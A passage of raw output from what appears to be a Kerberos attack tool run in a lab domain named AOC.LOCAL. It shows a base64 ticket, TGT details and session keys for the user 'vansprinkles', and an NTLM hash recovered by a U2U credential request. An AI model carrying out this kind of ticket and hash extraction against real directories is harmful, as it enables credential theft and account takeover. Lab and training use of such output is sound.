      dy6qDGme5qXfzlmdK4HftWUQ2AXCO+P20xvG0AYGSPLWGMleqDiU8XmBUCjsydVry1E56v5VnX5P75bl
      wN+mdeb20LlyD0ze09/ER52mnl8WY3MMNFS0HvGtYBAZ0vkUSbP58iIp7wVoNP6J943DE5CxcVWlZbq2
      8q7dQy4mSZ1pFGa5pLy1fhyW2Xkg4M0GMCa/T87+NGrLIdEh9HlU110FYLrVrkn2x8aHQ2vQ2vFDX1Lz
      RkFKWlf6xQGhjWmWzGN+S3bvBLR48fvUkdmkHpPH/OlXTS2rdBfTU3xoR6MDXVxJjiPxN+uh4UUrmVfR
      NAXLUPUnVByOroRy9ImwaFmpmNKykuBSVlC/hZgnhxjCRuHrfmudxc8HjYaRP8hgI6b4QeZ8pw3FWiL/
      3duISUou4rCObx2/nSF8iyx2WwT13d9j/681jAmshXZjS8erPoRB6QScTPTmSuuMCga3fQXJ9LSuzxyG
      g6PALv4A3PeEilcdhNBxn9GLToz7mMLdjRUGt5cXm7cPzQM99ryVxijpXcmE4BW7Ig8NhuO2ZoH0yMXa
      3MMAC3A1cu3LEL9V80Q7JIDdnwLSt3YNI+cYpRFOib4zVwGUwCs7jyLs6bSYzpl9lSVt7ZojGIaWNxuI
      kFwBjPGxElpQ/kKwcrNOpACJs1jB3LACDY+/0VO5TtTxofY6wWTBf830/yW1VmsXcWYSgweZCs0KPwLr
      gCVoQlvctfJ7njdnq1U+HjHsz7ozn/YAkT17XNn4LMdTlWPro4HRMIHOoAMCAQCigcYEgcN9gcAwgb2g
      gbowgbcwgbSgGzAZoAMCARehEgQQ35KkLhcYEjgwdx4UiExSqKELGwlBT0MuTE9DQUyiGTAXoAMCAQGh
      EDAOGwx2YW5zcHJpbmtsZXOjBwMFAEDhAAClERgPMjAyMzEyMTYxNzUxNDBaphEYDzIwMjMxMjE3MDM1
      MTQwWqcRGA8yMDIzMTIyMzE3NTE0MFqoCxsJQU9DLkxPQ0FMqR4wHKADAgECoRUwExsGa3JidGd0GwlB
      T0MubG9jYWw=

  ServiceName              :  krbtgt/AOC.local
  ServiceRealm             :  AOC.LOCAL
  UserName                 :  vansprinkles
  UserRealm                :  AOC.LOCAL
  StartTime                :  12/16/2023 5:51:40 PM
  EndTime                  :  12/17/2023 3:51:40 AM
  RenewTill                :  12/23/2023 5:51:40 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  35KkLhcYEjgwdx4UiExSqA==
  ASREP (key)              :  9ABE9F2D5B89C07733D85ED648980462

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : 03E805D8A8C5AA435FB48832DAD620E3

       
